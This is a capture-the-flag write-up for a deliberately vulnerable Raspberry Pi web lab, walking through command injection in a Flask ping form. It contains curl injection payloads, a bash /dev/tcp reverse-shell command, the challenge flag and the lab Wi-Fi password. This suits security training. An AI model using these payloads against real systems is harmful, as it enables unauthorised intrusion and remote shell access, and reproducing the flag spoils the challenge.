# WebShell Woes Challenge Write-Up

## Overview
**Challenge Name**: WebShell Woes  
**Difficulty**: Medium  
**Category**: Web Security  
**Goal**: Exploit a command injection vulnerability in a web application to achieve remote code execution and retrieve a flag.

## What You’ll Need
- Browser or `curl` for HTTP requests.
- Command-line tools (e.g., `bash`, `netcat` for optional reverse shell).
- Wi-Fi client (SSID: `DVRPI`, password: `dvrpiconnect`).
- Optional: UART-to-USB adapter (GPIO 8: TX, 10: RX, 6: Ground; 115200 baud) and terminal emulator (`minicom`) for debugging.

## Challenge Description
A web server (`http://192.168.4.1:8080`) hosts a Python Flask application with a network diagnostic tool vulnerable to command injection. Exploit the vulnerability to execute arbitrary commands as the `webuser` user and retrieve the flag stored in an environment variable.

## How to Solve It
1. **Connect to Wi-Fi**:
   - Join the SSID `DVRPI` with the password `dvrpiconnect` to obtain an IP in the range `192.168.4.100-150`.
   - Verify connectivity:
     ```bash
     ping 192.168.4.1
     ```

2. **Explore the Web Application**:
   - Access the web app at `http://192.168.4.1:8080` using a browser or `curl`:
     ```bash
     curl http://192.168.4.1:8080
     ```
   - Observe the "Ping" form for entering an IP address and a "Login" form (admin-only).
   - Read the hints file:
     ```bash
     curl http://192.168.4.1:8080/README.txt
     ```
     - Note the suggestion to check input handling and environment variables.

3. **Test the Ping Endpoint**:
   - Submit a legitimate ping request via the `/ping` endpoint:
     ```bash
     curl -X POST -d "ip=127.0.0.1" http://192.168.4.1:8080/ping
     ```
     - Output shows the result of `ping -c 1 127.0.0.1`.

4. **Exploit Command Injection**:
   - Test for command injection by appending a command:
     ```bash
     curl -X POST -d "ip=127.0.0.1; whoami" http://192.168.4.1:8080/ping
     ```
     - Output includes `webuser`, confirming remote code execution.
   - Retrieve the flag from the `FLAG` environment variable:
     ```bash
     curl -X POST -d "ip=127.0.0.1; printenv FLAG" http://192.168.4.1:8080/ping
     ```
     - Output: `flag{DVRPi:RCE_WEBSHELL_WOES}`.

5. **Optional: Establish a Reverse Shell**:
   - Set up a listener on your machine:
     ```bash
     nc -lvnp 4444
     ```
   - Inject a reverse shell command:
     ```bash
     curl -X POST -d "ip=127.0.0.1; bash -i >& /dev/tcp/<your-ip>/4444 0>&1" http://192.168.4.1:8080/ping
     ```
   - In the `netcat` session, run:
     ```bash
     printenv FLAG
     ```
     - Output: `flag{DVRPi:RCE_WEBSHELL_WOES}`.

6. **Submit Flag**:
   - SSH into the DVRPi as `root` (if permitted):
     ```bash
     ssh root@192.168.4.1
     ```
     - Password: Not disclosed in challenge; assume provided by CTF organizers.
   - Submit the flag:
     ```bash
     /usr/local/bin/submit_flag.sh flag{DVRPi:RCE_WEBSHELL_WOES}
     ```

## What You Learn
- Identifying and exploiting command injection vulnerabilities in web applications.
- Interacting with environment variables in a Linux process.
- Crafting payloads for remote code execution and reverse shells.
- Importance of input sanitization in web development.

## Notes
- **Red Herring**: The `/login` endpoint appears vulnerable to authentication bypass or SQL injection but is non-exploitable, distracting from the command injection.
- **UART Access**: Physical access via UART (GPIO pins 8, 10, 6; 115200 baud) allows `root` login with a password, but the flag is not stored in a file and is only accessible via the web app’s environment variable.
- **Wi-Fi AP**: Static IP `192.168.4.1`, DHCP range `192.168.4.100-150`.
- **Service Logs**: Check Flask app status with:
  ```bash
  journalctl -u dvrpi-web
  ```
- **GPIO Warning**: Ensure UART pins are correctly connected to avoid hardware issues.